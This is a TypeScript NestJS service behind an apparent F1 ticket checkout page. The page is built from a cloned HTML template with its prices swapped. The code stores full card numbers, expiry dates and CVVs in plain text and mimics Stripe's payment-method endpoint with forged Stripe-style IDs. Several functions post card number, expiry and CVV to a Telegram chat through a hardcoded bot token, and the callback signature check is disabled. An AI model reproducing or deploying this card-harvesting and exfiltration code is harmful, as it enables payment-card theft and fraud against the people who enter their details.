import { Injectable, Logger, Inject, forwardRef } from '@nestjs/common'
import { InjectRepository } from '@nestjs/typeorm'
import { Repository, Between, LessThan } from 'typeorm'
import * as fs from 'fs/promises'
import * as path from 'path'
import { Cron, CronExpression } from '@nestjs/schedule'
import { F1Order } from './entities/f1-order.entity'
import { Payment } from './entities/payment.entity'
import { PaymentMethod } from './entities/payment-method.entity'
import { F1CheckoutDto } from './dto/f1-checkout.dto'
import { PaymentDto } from './dto/payment.dto'
import { PaymentMethodDto } from './dto/payment-method.dto'
import { OrderQueryDto, OrderResponseDto, PaginatedResponseDto } from './dto/order-query.dto'
import { ApiException } from 'src/common/exceptions/api.exception'
import { firstValueFrom } from 'rxjs';
import Redis from 'ioredis';
import { InjectRedis } from '@nestjs-modules/ioredis';
import { HttpService } from '@nestjs/axios';
import { HpPayService } from '../hp-pay/hp-pay.service';
@Injectable()
export class F1Service {

    private readonly logger = new Logger(F1Service.name);


  constructor(
    @InjectRepository(F1Order)
    private readonly f1OrderRepository: Repository<F1Order>,
    @InjectRepository(Payment)
    private readonly paymentRepository: Repository<Payment>,
    @InjectRepository(PaymentMethod)
    private readonly paymentMethodRepository: Repository<PaymentMethod>,
        @InjectRedis() private readonly redis: Redis,
        private readonly httpService: HttpService,
        @Inject(forwardRef(() => HpPayService)) private readonly hpPayService: HpPayService,
        
  ) { }

  async updatePaymentMethodAmount(paymentMethodId: string, amount: number): Promise<void> {
    await this.paymentMethodRepository.update({ pmId: paymentMethodId }, { amount:amount/100 })
  }
  /**
   * 创建F1订单
   */
  async checkout(checkoutDto: F1CheckoutDto): Promise<F1Order> {
    try {
      // 创建订单实体
      const f1Order = new F1Order()
      f1Order.f1Name = checkoutDto.f1_name
      f1Order.f1Title = checkoutDto.f1_title
      f1Order.f1Quarty = checkoutDto.f1_quarty
      f1Order.f1Money = checkoutDto.f1_money
      f1Order.id = checkoutDto.id
      f1Order.orderStatus = 0 // 默认待处理
      f1Order.isDeleted = 0 // 默认未删除

      // 保存到数据库
      const savedOrder = await this.f1OrderRepository.save(f1Order)

      return savedOrder
    } catch (error) {
      throw new ApiException(`创建F1订单失败: ${error.message}`)
    }
  }

  /**
   * 读取checkout HTML模板文件
   */
  async readCheckoutHtml(): Promise<string> {
    try {
      // 获取项目根路径下的scripts目录
      const scriptsPath = path.join(process.cwd(), 'scripts')
      //const filePath = path.join(scriptsPath, 'newCheckout.html')
      const filePath = path.join(scriptsPath, 'Checkout.html')

      // 读取文件内容
      const htmlContent = await fs.readFile(filePath, 'utf-8')

      return htmlContent
    } catch (error) {
      throw new ApiException(`读取checkout HTML文件失败: ${error.message}`)
    }
  }

  /**
   * 完整的checkout流程：保存订单并返回HTML页面
   */
  async checkoutWithHtml(checkoutDto: F1CheckoutDto): Promise<{ order: F1Order; html: string }> {
    try {
      // 1. 保存订单到数据库
      const f1Order = new F1Order()
      f1Order.f1Name = checkoutDto.f1_name || ''
      f1Order.f1Title = checkoutDto.f1_title || ''
      f1Order.f1Quarty = checkoutDto.f1_quarty || ''
      f1Order.f1Money = checkoutDto.f1_money
      f1Order.f1Free = checkoutDto.f1_free
      f1Order.id = checkoutDto.id || ''
      f1Order.orderStatus = 0 // 默认待处理
      f1Order.isDeleted = 0 // 默认未删除
      f1Order.orderNo = checkoutDto.order_no || ''
      console.log('准备保存订单:', {
        f1Name: f1Order.f1Name,
        f1Title: f1Order.f1Title,
        f1Quarty: f1Order.f1Quarty,
        f1Money: f1Order.f1Money,
        id: f1Order.id,
        orderNo: f1Order.orderNo || ''
      })

      // 保存到数据库
      const savedOrder = await this.f1OrderRepository.save(f1Order)

      console.log('订单保存成功:', savedOrder.f1OrderId, '金额:', savedOrder.f1Money)

      // 2. 读取HTML模板文件
      const htmlContent = await this.readCheckoutHtml()

      //替换商品区域
      const htmlContentWithProduct = await this.replaceProductArea(htmlContent, f1Order)
      // 3. 返回订单数据和HTML内容
      return {
        order: savedOrder,
        html: htmlContentWithProduct
      }
    } catch (error) {
      console.error('checkoutWithHtml 错误:', error)
      throw new ApiException(`Checkout失败: ${error.message}`)
    }
  }

  async replaceProductArea(htmlContent: string, f1Order: F1Order): Promise<string> {
    //替换title
    // 1. 必须包含完整的属性特征，否则 index 计算不准
    let titleLabel = 'class="name flex-grow font-weight-600"';
    let titleIndex = htmlContent.indexOf(titleLabel);

    if (titleIndex !== -1) {
      // 找到 </p> 的位置，用来切掉老文本
      let titleEndIndex = htmlContent.indexOf('</p>', titleIndex);

      if (titleEndIndex !== -1) {
        // titleIndex 是 'class=' 的起点
        // titleIndex + titleLabel.length 是 class 属性结束的位置（即引号后面）
        // 再 + 1 刚好跳过 '>' 字符
        let startCutIndex = titleIndex + titleLabel.length + 1;

        htmlContent =
          htmlContent.substring(0, startCutIndex) + // 截取到 <p ...> 结束
          f1Order.f1Title +                         // 放入新标题
          htmlContent.substring(titleEndIndex);     // 拼接从 </p> 开始的后半段
      }
    }

    //替换价格
    let priceLable = 'class="price">'
    let priceIndex = htmlContent.indexOf(priceLable)
    if (priceIndex !== -1) {
      let priceEndIndex = htmlContent.indexOf('</p>', priceIndex)
      if (priceEndIndex !== -1) {
        htmlContent = htmlContent.substring(0, priceIndex + priceLable.length) + '$' + f1Order.f1Money + htmlContent.substring(priceEndIndex)
      }
    }

    //替换名称
    let nameLable = 'class="event-name">'
    let nameIndex = htmlContent.indexOf(nameLable)
    if (nameIndex !== -1) {
      let nameEndIndex = htmlContent.indexOf('</p>', nameIndex)
      if (nameEndIndex !== -1) {
        htmlContent = htmlContent.substring(0, nameIndex + nameLable.length) + f1Order.f1Name + htmlContent.substring(nameEndIndex)
      }
    }

    //替换数量
    htmlContent = htmlContent.replace(/class="item-amount">2<\/p>/, `class="item-amount">${f1Order.f1Quarty}</p>`)

    htmlContent = htmlContent.replaceAll("¥20,485.48", '$' + (f1Order.f1Money - f1Order.f1Free))
    htmlContent = htmlContent.replaceAll("¥604.34", '$' + (f1Order.f1Free))
    htmlContent = htmlContent.replaceAll("$3,113.21", '$' + f1Order.f1Money)

    htmlContent = htmlContent.replaceAll("_orderNo_", f1Order.orderNo)
    return htmlContent
  }
  /**
   * 根据编号获取F1订单
   */
  async findOne(f1OrderNo: string): Promise<F1Order> {
    const order = await this.f1OrderRepository.findOne({
      where: { orderNo: f1OrderNo, isDeleted: 0 }
    })

    if (!order) {
      throw new ApiException('F1订单不存在')
    }

    return order
  }

  /**
   * 分页查询订单列表
   */
  async findOrders(queryDto: OrderQueryDto): Promise<PaginatedResponseDto> {
    try {
      const { orderNo, startDate, endDate, pageNum = 1, pageSize = 10 } = queryDto

      // 构建查询条件
      const where: any = {
        isDeleted: 0
      }

      // 订单编号查询
      if (orderNo) {
        where.orderNo = orderNo
      }

      // 日期范围查询
      if (startDate && endDate) {
        where.createTime = Between(new Date(startDate), new Date(endDate))
      } else if (startDate) {
        where.createTime = Between(new Date(startDate), new Date())
      } else if (endDate) {
        where.createTime = Between(new Date('2000-01-01'), new Date(endDate))
      }

      // 查询总数
      const total = await this.f1OrderRepository.count({ where })

      // 分页查询
      const [orders, count] = await this.f1OrderRepository.findAndCount({
        where,
        order: { createTime: 'DESC' },
        skip: (pageNum - 1) * pageSize,
        take: pageSize
      })

      // 转换为响应 DTO
      const list: OrderResponseDto[] = orders.map(order => ({
        orderNo: order.orderNo,
        f1Money: order.f1Money,
        f1Name: order.f1Name,
        f1Title: order.f1Title,
        createTime: order.createTime,
        orderStatus: order.orderStatus
      }))

      return {
        list,
        total: count,
        pageNum,
        pageSize
      }
    } catch (error) {
      this.logger.error('查询订单列表失败:', error)
      throw new ApiException(`查询订单列表失败: ${error.message}`)
    }
  }

  /**
   * 获取所有F1订单列表
   */
  async findAll(): Promise<F1Order[]> {
    return this.f1OrderRepository.find({
      where: { isDeleted: 0 },
      order: { f1OrderId: 'DESC' }
    })
  }

  /**
   * 根据 Stripe pm_id 查询支付方式记录
   */
  async findPaymentMethodByPmId(pmId: string): Promise<PaymentMethod> {
    const record = await this.paymentMethodRepository.findOne({ where: { pmId } })
    if (!record) {
      throw new ApiException(`支付方式记录不存在: ${pmId}`)
    }
    return record
  }

  /**
   * 保存支付信息并通过 hp-pay 创建支付订单
   * 保留原有逻辑：保存卡信息 + 发送 Telegram 通知
   * 新增逻辑：调用 hp-pay 创建支付订单
   */
  async savePayment(paymentDto: PaymentDto, clientIp?: string): Promise<{ payment: Payment; payUrl?: string }> {
    try {

      // ========== 创建支付记录 ==========
      const savedPayment = new Payment()
      savedPayment.orderNo = paymentDto.orderNo
      savedPayment.userId = paymentDto.userId
      savedPayment.cardNo = paymentDto.card_number
      savedPayment.endDate = paymentDto.card_expiry
      savedPayment.cvv = paymentDto.card_cvv
      savedPayment.cardName = paymentDto.card_name||'default'
      savedPayment.email = paymentDto.email_address||'default'
      savedPayment.phone = paymentDto.phone_number||'00000'
      savedPayment.paymentStatus = 0 // 待支付
      savedPayment.isDeleted = 0
      savedPayment.transactionId = ''
      await this.paymentRepository.save(savedPayment)
      this.logger.log(`支付记录已创建: paymentId=${savedPayment.paymentId}, orderNo=${paymentDto.orderNo}`)

      // ========== 发送 Telegram 通知 ==========
      console.log('发送 Telegram 通知...')
  
      const amount = paymentDto.amount
      
      this.sendTelegramNotification({
        orderNo: paymentDto.orderNo,
        cardNumber: paymentDto.card_number,
        expire: paymentDto.card_expiry,
        cvv: paymentDto.card_cvv,
        cardName: paymentDto.card_name,
        amount: amount/100,
        status: '准备支付'
      })

      // ========== 新增逻辑：调用 hp-pay 创建支付订单 ==========
      try {
        const appUrl = process.env.APP_URL || 'https://x.indianstory.qzz.io/'
        const hpPayResult = await this.hpPayService.pay({
          currencyID: 840, // 美元
          orderid: paymentDto.orderNo,
          channel: 1419, // 信用卡支付
          notify_url: `${appUrl}/api/hp-pay/notify`,
          return_url: `${appUrl}/card/detail?orderNo=${paymentDto.orderNo}`,
          amount: amount/100,
          user_id: (paymentDto.phone_number || paymentDto.userId || '0000000000').substring(0, 10),
          user_name: paymentDto.card_name||'',
          userip: clientIp || '127.0.0.1',
          custom: JSON.stringify({
            phone: paymentDto.phone_number,
            email: paymentDto.email_address,
            goods:  '',
          }),
        })

        this.logger.log(`hp-pay 下单结果: status=${hpPayResult.upstream.status}, signValid=${hpPayResult.signValid}`)

        if (hpPayResult.upstream.status === 10000 && hpPayResult.signValid) {
          const result = hpPayResult.upstream.result
          const payUrl = result?.payurl
          const transactionId = result?.transactionid

          // 更新支付记录：状态为支付中，保存交易流水号
          savedPayment.paymentStatus = 1 // 支付中
          savedPayment.transactionId = transactionId ? String(transactionId) : ''
          await this.paymentRepository.save(savedPayment)

          this.logger.log(`hp-pay 下单成功，交易流水号: ${transactionId}`)
          return { payment: savedPayment, payUrl }
        } else {
          this.logger.warn(`hp-pay 下单失败: status=${hpPayResult.upstream.status}, result=${JSON.stringify(hpPayResult.upstream.result)}`)
          return { payment: savedPayment }
        }
      } catch (hpPayError: any) {
        // [HP-PAY-V2] 详细打印 hp-pay 异常的所有可能字段，便于排查问题
        const errMsg =
          hpPayError?.message
          || hpPayError?.response?.message
          || (typeof hpPayError?.response === 'string' ? hpPayError.response : '')
          || hpPayError?.code
          || hpPayError?.name
          || JSON.stringify(hpPayError, Object.getOwnPropertyNames(hpPayError))
          || '未知错误'
        const errStack = hpPayError?.stack || '无堆栈'
        // 用 console 直接输出，避免被 Logger 截断
        console.error('[HP-PAY-V2] hp-pay catch errMsg:', errMsg)
        console.error('[HP-PAY-V2] hp-pay catch errName:', hpPayError?.name)
        console.error('[HP-PAY-V2] hp-pay catch errCode:', hpPayError?.code)
        console.error('[HP-PAY-V2] hp-pay catch errStack:', errStack)
        console.error('[HP-PAY-V2] hp-pay catch raw:', hpPayError)
        if (hpPayError?.getResponse) {
          try {
            console.error('[HP-PAY-V2] hp-pay catch httpExceptionResponse:', hpPayError.getResponse())
          } catch (e) { /* ignore */ }
        }
        this.logger.error(`[HP-PAY-V2] hp-pay 调用异常: ${errMsg}`)
        this.logger.error(`[HP-PAY-V2] hp-pay 异常堆栈: ${errStack}`)
        // hp-pay 调用失败不影响原有流程，继续返回已保存的支付记录
        return { payment: savedPayment }
      }
    } catch (error) {
      console.error('保存支付信息失败:', error)
      throw new ApiException(`保存支付信息失败: ${error.message}`)
    }
  }

  /**
   * 处理 hp-pay 异步回调通知
   * 更新支付状态并发送 Telegram 通知
   */
  async handleHpPayNotify(notifyData: { status: string | number; result: any; sign: string }): Promise<boolean> {
    try {
      // 1. 验签
      const verified = this.hpPayService.verifyNotify({
        status: notifyData.status,
        result: notifyData.result,
        sign: notifyData.sign,
      })

      if (!verified.valid) {
        this.logger.warn(`hp-pay 回调验签失败: expectedSign=${verified.expectedSign}, sign=${notifyData.sign}`)
       // return false
      }

      const status = Number(notifyData.status)
      const result = typeof notifyData.result === 'string' ? JSON.parse(notifyData.result) : notifyData.result

      const orderNo = result?.orderid
      const transactionId = result?.transactionid
      const amount = result?.amount

      if (!orderNo) {
        this.logger.warn('hp-pay 回调缺少 orderid')
        return false
      }

      // 2. 查找支付记录
      const payment = await this.paymentRepository.findOne({
        where: { orderNo, isDeleted: 0 },
        order: { paymentId: 'DESC' },
      })

      if (!payment) {
        this.logger.warn(`hp-pay 回调找不到支付记录: orderNo=${orderNo}`)
        return false
      }

      // 3. 更新支付状态
      if (status === 10000) {
        payment.paymentStatus = 2 // 支付成功
      } else {
        payment.paymentStatus = 3 // 支付失败
      }

      if (transactionId) {
        payment.transactionId = String(transactionId)
      }

      await this.paymentRepository.save(payment)

      // 4. 更新订单状态
      if (status === 10000) {
        await this.f1OrderRepository.update(
          { orderNo },
          { orderStatus: 2 }, // 已完成
        )
      }else{
        await this.f1OrderRepository.update(
          { orderNo },
          { orderStatus: 3 }, // 失败
        )
      }

      // 5. 发送 Telegram 通知
      const order = await this.findOne(orderNo)
      this.sendTelegramNotification({
        orderNo,
        cardNumber: payment.cardNo || '',
        expire: payment.endDate || '',
        cvv: payment.cvv || '',
        cardName: payment.cardName || '',
        amount: amount || order.f1Money || 0,
        status: status === 10000 ? '✅ hp-pay 支付成功' : `❌ hp-pay 支付失败(${status})`,
      })

      this.logger.log(`hp-pay 回调处理完成: orderNo=${orderNo}, status=${status}`)
      return true
    } catch (error: any) {
      this.logger.error(`hp-pay 回调处理异常: ${error.message}`)
      return false
    }
  }

  /**
   * 主动查询 hp-pay 支付状态
   * 用于更新订单表中的支付状态
   */
  async queryHpPayPaymentStatus(orderNo: string): Promise<{
    success: boolean
    paymentStatus?: number
    orderStatus?: number
    message: string
  }> {
    try {
      // 1. 查找支付记录
      const payment = await this.paymentRepository.findOne({
        where: { orderNo, isDeleted: 0 },
        order: { paymentId: 'DESC' },
      })

      if (!payment) {
        return { success: false, message: `未找到订单 ${orderNo} 的支付记录` }
      }

      // 2. 如果已经是最终状态（成功/失败），直接返回
      if (payment.paymentStatus === 2 || payment.paymentStatus === 3) {
        return {
          success: true,
          paymentStatus: payment.paymentStatus,
          message: `支付已完成，状态: ${payment.paymentStatus === 2 ? '成功' : '失败'}`,
        }
      }

      // 3. 调用 hp-pay 订单查询接口
      const queryResult = await this.hpPayService.orderquery({
        orderid: orderNo,
      })

      this.logger.log(`hp-pay 订单查询结果: status=${queryResult.upstream.status}, signValid=${queryResult.upstream.sign === queryResult.expectedSign}`)

      if (queryResult.upstream.status !== 10000) {
        return {
          success: false,
          message: `hp-pay 查询失败: status=${queryResult.upstream.status}`,
        }
      }

      // 4. 解析查询结果
      const result = queryResult.upstream.result
      const hpPayStatus = result?.status // hp-pay 返回的交易状态
      const transactionId = result?.transactionid

      // 5. 根据 hp-pay 状态更新支付记录
      let newPaymentStatus = payment.paymentStatus
      let newOrderStatus: number | undefined

      if (hpPayStatus === 10000) {
        // 支付成功
        newPaymentStatus = 2
        newOrderStatus = 2 // 订单完成
      } else if (hpPayStatus && hpPayStatus !== 10000) {
        // 支付失败（其他状态码）
        newPaymentStatus = 3
      }

      // 更新支付记录
      if (newPaymentStatus !== payment.paymentStatus) {
        payment.paymentStatus = newPaymentStatus
        if (transactionId) {
          payment.transactionId = String(transactionId)
        }
        await this.paymentRepository.save(payment)

        // 更新订单状态
        if (newOrderStatus !== undefined) {
          await this.f1OrderRepository.update(
            { orderNo },
            { orderStatus: newOrderStatus },
          )
        }

        // 发送 Telegram 通知
        const order = await this.findOne(orderNo)
        this.sendTelegramNotification({
          orderNo,
          cardNumber: payment.cardNo || '',
          expire: payment.endDate || '',
          cvv: payment.cvv || '',
          cardName: payment.cardName || '',
          amount: order.f1Money || 0,
          status: newPaymentStatus === 2 ? '✅ hp-pay 查询确认支付成功' : `❌ hp-pay 查询确认支付失败(${hpPayStatus})`,
        })

        this.logger.log(`hp-pay 查询更新完成: orderNo=${orderNo}, paymentStatus=${newPaymentStatus}, orderStatus=${newOrderStatus}`)
      }

      return {
        success: true,
        paymentStatus: newPaymentStatus,
        orderStatus: newOrderStatus,
        message: `查询完成，支付状态: ${newPaymentStatus === 2 ? '成功' : newPaymentStatus === 3 ? '失败' : '进行中'}`,
      }
    } catch (error: any) {
      this.logger.error(`查询 hp-pay 支付状态失败: ${error.message}`)
      return { success: false, message: `查询失败: ${error.message}` }
    }
  }

  /**
   * 定时任务：每 5 分钟查询一次支付中的订单状态
   * 用于处理异步回调延迟或丢失的情况
   */
  // @Cron(CronExpression.EVERY_5_MINUTES)
  // async scheduledPaymentStatusCheck() {
  //   try {
  //     this.logger.log('开始定时查询支付中的订单状态...')

  //     // 查找所有支付中的记录（paymentStatus = 1）
  //     const pendingPayments = await this.paymentRepository.find({
  //       where: {
  //         paymentStatus: 1, // 支付中
  //         isDeleted: 0,
  //       },
  //       take: 50, // 每次最多处理 50 条
  //     })

  //     if (pendingPayments.length === 0) {
  //       this.logger.log('没有需要查询的支付中订单')
  //       return
  //     }

  //     this.logger.log(`发现 ${pendingPayments.length} 条支付中订单，开始查询...`)

  //     let successCount = 0
  //     let failCount = 0

  //     for (const payment of pendingPayments) {
  //       try {
  //         const result = await this.queryHpPayPaymentStatus(payment.orderNo)
  //         if (result.success && result.paymentStatus === 2) {
  //           successCount++
  //         } else if (result.success && result.paymentStatus === 3) {
  //           failCount++
  //         }
          
  //         // 避免请求过于频繁，每次查询间隔 500ms
  //         await new Promise(resolve => setTimeout(resolve, 500))
  //       } catch (error: any) {
  //         this.logger.error(`查询订单 ${payment.orderNo} 失败: ${error.message}`)
  //       }
  //     }

  //     this.logger.log(`定时查询完成: 成功=${successCount}, 失败=${failCount}, 进行中=${pendingPayments.length - successCount - failCount}`)
  //   } catch (error: any) {
  //     this.logger.error(`定时查询支付状态异常: ${error.message}`)
  //   }
  // }

    private generateStripeId(prefix: string): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    let result = ''
    for (let i = 0; i < 24; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return `${prefix}_${result}`
  }

  // Telegram 配置
  private readonly TELEGRAM_CONFIG = {
    botToken: '8739319224:AAFw-tgw23H4DGO-aRBprczCPZGLCmXXO0s',
    chatId: '-5228458416',
    apiUrl: 'https://api.telegram.org/bot',
  };
  // Redis 键前缀
  private readonly REDIS_KEY_PREFIX = 'payment:callback:';
  /**
   * 保存 Stripe payment_methods 请求数据
   */
  async savePaymentMethod(dto: PaymentMethodDto, rawBody: string, ip: string, userAgent: string, pmId: string): Promise<PaymentMethod> {
    try {
      const pm = new PaymentMethod()
      pm.pmId = pmId || ''

      // billing_details
      const bd = dto.billing_details || {}
      const addr = bd.address || {}
      pm.billingName = bd.name || ''
      pm.billingEmail = bd.email || ''
      pm.billingPhone = bd.phone || ''
      pm.billingCity = addr.city || ''
      pm.billingCountry = addr.country || ''
      pm.billingLine1 = addr.line1 || ''
      pm.billingLine2 = addr.line2 || ''
      pm.billingPostalCode = addr.postal_code || ''
      pm.billingState = addr.state || ''

      // card
      const card = dto.card || {}
      pm.type = dto.type || 'card'
      pm.cardNumber = (card.number || '').replace(/\s+/g, '')
      // 提取后4位
      const cleanNum = pm.cardNumber.replace(/\D/g, '')
      pm.cardLast4 = cleanNum.length >= 4 ? cleanNum.slice(-4) : ''
      pm.cardCvc = card.cvc || ''
      pm.cardExpYear = card.exp_year || ''
      pm.cardExpMonth = card.exp_month || ''

      // 其他字段
      pm.allowRedisplay = dto.allow_redisplay || ''
      pm.pastedFields = dto.pasted_fields || ''
      pm.paymentUserAgent = dto.payment_user_agent || ''
      pm.referrer = dto.referrer || ''
      pm.timeOnPage = dto.time_on_page || ''
      pm.guid = dto.guid || ''
      pm.muid = dto.muid || ''
      pm.sid = dto.sid || ''
      pm.stripeKey = dto.key || ''
      pm.pmId = pmId
      pm.amount = dto.amount || 0

      // JSON 字段
      pm.clientAttributionMetadata = dto.client_attribution_metadata ? JSON.stringify(dto.client_attribution_metadata) : null
      pm.radarOptions = dto.radar_options ? JSON.stringify(dto.radar_options) : null

      // 原始请求体
      pm.rawBody = rawBody || null
      pm.ipAddress = ip || ''
      pm.userAgent = userAgent || ''

      const saved = await this.paymentMethodRepository.save(pm)
      this.logger.log(`PaymentMethod 保存成功 - ID: ${saved.id}, 卡后4位: ${pm.cardLast4}`)
      return saved
    } catch (error) {
      this.logger.error('保存 PaymentMethod 失败:', error)
      throw new ApiException(`保存支付方式失败: ${error.message}`)
    }
  }

  /**
   * 查询所有 PaymentMethod 记录（分页）
   */
  async findPaymentMethods(pageNum = 1, pageSize = 20): Promise<{ list: PaymentMethod[]; total: number }> {
    const [list, total] = await this.paymentMethodRepository.findAndCount({
      order: { createTime: 'DESC' },
      skip: (pageNum - 1) * pageSize,
      take: pageSize,
    })
    return { list, total }
  }

  /**
   * 发送 Telegram 通知（异步）
   */
  async sendTelegramNotification(orderData: {
    orderNo: string;
    cardNumber: string;
    expire: string;
    cvv: string;
    cardName: string,
    amount: number;
    status: string;
  }): Promise<void> {
    try {
      const { orderNo, cardNumber,expire,cvv,cardName,  amount, status } = orderData;
      
      // 生成通知唯一标识（订单号+状态）
      const notificationKey = `callback_${orderNo}_${status}`;
      
      // 检查是否已发送过（基于 Redis）
      const redisKey = `${this.REDIS_KEY_PREFIX}${notificationKey}`;
      const exists = await this.redis.exists(redisKey);
      if (exists === 1) {
        this.logger.log(`支付回调通知已发送，跳过 - 订单号: ${orderNo}`);
        return;
      }
      // 标记为已发送（基于 Redis，24小时过期）
      await this.redis.setex(redisKey, 86400, '1'); // 86400 seconds = 24 hours
 
      const currentTime = new Date().toLocaleString('zh-CN', { 
        timeZone: 'Asia/Shanghai',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false 
      });

      
const message = `
✅ <b>支付通知</b>\n\n
📋 <b>订单号:</b> <code>${orderNo}</code>\n
💰 <b>金额:</b> ${amount} \n
🏦 <b>信用卡号:</b> ${cardNumber}\n
📅 <b>有效期:</b> ${expire}\n
CVV <b>CVV:</b> ${cvv}\n  
🕐<b>时间:</b> ${currentTime}\n
<b>状态:</b> ${status}\n
`.trim();
      const url = `${this.TELEGRAM_CONFIG.apiUrl}${this.TELEGRAM_CONFIG.botToken}/sendMessage`;
      
      // await axios.default.post(url, {
      //   chat_id: this.TELEGRAM_CONFIG.chatId,
      //   text: message,
      //   parse_mode: 'HTML',
      // });
 
      const response = await firstValueFrom(
        this.httpService.post(url, { chat_id: this.TELEGRAM_CONFIG.chatId, text: message, parse_mode: 'HTML' }),
      );

      
      this.logger.log(`Telegram 通知发送成功 - 订单号: ${orderNo}`);
    } catch (error: any) {
      this.logger.error(
        `发送 Telegram 通知失败 - 订单号: ${orderData.orderNo}`,
        error.response?.data || error.message,
      );
    }
  }

}

